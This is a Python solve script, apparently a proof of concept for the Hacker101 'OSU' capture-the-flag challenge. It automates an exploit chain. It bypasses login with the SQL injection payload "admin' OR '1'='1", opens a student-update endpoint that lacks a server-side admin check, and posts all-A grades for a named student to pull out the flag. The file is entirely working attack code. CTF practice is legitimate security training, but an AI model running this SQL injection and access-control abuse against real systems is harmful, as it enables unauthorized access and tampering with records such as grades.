#!/usr/bin/env python3
"""
PoC: OSU CTF (HackerOne CTF)

Automates the full exploit chain:
  1. SQL injection on /login to obtain session token
  2. Direct access to /update-student/{base64_name} endpoint (no server-side admin check)
  3. POST grade update with all A's for Natasha_Drew
  4. Extract flag from response

Usage: python3 solve.py <ctf_url>
Example: python3 solve.py https://<instance>.ctf.hacker101.com
"""

import sys
import re
import base64
import requests


def solve(base_url: str) -> str:
    """Execute the full exploit chain and return the flag hex."""
    s = requests.Session()
    base_url = base_url.rstrip("/")

    # Step 1: SQL injection on login form
    print("[*] Performing SQL injection login...")
    sqli_payload = "admin' OR '1'='1"
    r = s.post(
        f"{base_url}/login",
        data={"username": sqli_payload, "password": sqli_payload},
        allow_redirects=False,
    )

    token = s.cookies.get("token")
    if not token:
        sys.exit("[-] Login failed — no token cookie received. Try another instance.")

    print(f"[+] Authenticated (token: {token[:32]}...)")

    # Step 2: Access Natasha Drew's update page
    # The endpoint is /update-student/{base64(Firstname_Lastname)}
    # No server-side admin check is performed — only client-side JS guards it
    student_b64 = base64.b64encode(b"Natasha_Drew").decode()
    print(f"[*] Accessing /update-student/{student_b64} ...")

    r = s.get(f"{base_url}/update-student/{student_b64}")
    if r.status_code != 200:
        sys.exit(f"[-] Failed to access Natasha's page: HTTP {r.status_code}")

    # Step 3: Extract the student_hash from the form (needed for the POST)
    hash_match = re.search(r'name="student_hash"\s+value="([^"]+)"', r.text)
    if not hash_match:
        sys.exit("[-] Could not extract student_hash from the page.")

    student_hash = hash_match.group(1)
    print(f"[+] student_hash: {student_hash}")

    # Step 4: POST grade update — set all grades to A
    print("[*] Updating grades to all A's...")
    r = s.post(
        f"{base_url}/update-student/{student_b64}",
        data={
            "student_hash": student_hash,
            "grade_english": "A",
            "grade_science": "A",
            "grade_maths": "A",
        },
    )

    # Step 5: Extract the flag
    flag_match = re.search(r"\^FLAG\^([a-f0-9]{64})\$FLAG\$", r.text)
    if not flag_match:
        print("[-] Flag not found in response.")
        print(f"[*] Response excerpt: {r.text[:1000]}")
        sys.exit(1)

    flag_hex = flag_match.group(1)
    print(f"\n[+] Flag 0: {flag_hex}")
    return flag_hex


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ctf_base_url>")
        print(f"Example: {sys.argv[0]} https://<instance>.ctf.hacker101.com")
        sys.exit(1)

    base_url = sys.argv[1]
    flag = solve(base_url)

    print(f"\n[*] Done. Flag hex: {flag}")


if __name__ == "__main__":
    main()
